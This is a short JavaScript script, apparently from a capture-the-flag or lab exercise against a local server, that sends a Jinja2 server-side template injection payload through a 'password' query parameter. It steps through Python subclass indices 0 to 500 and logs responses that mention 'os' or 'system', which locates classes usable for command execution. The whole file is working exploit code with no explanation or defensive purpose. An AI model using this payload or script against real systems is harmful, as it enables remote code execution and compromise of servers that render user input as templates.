async function fetchURLs() {
	for (let i = 0; i <= 500; i++) {
		const url = `http://localhost:8000/?password={{().__class__.__bases__.__getitem__(0).__subclasses__()[${i}]}}`;
		try {
			const response = await fetch(url);
			const data = await response.text(); // Use text() instead of json()

			// console.log(`Response for index ${i}:`, data);

			if (data.includes('os') || data.includes('system')) {
				console.log(`Response for index ${i}:`, data);
				// break;
			}
		} catch (error) {
			console.error(`Error fetching index ${i}:`, error.message);
		}
	}
}

fetchURLs();
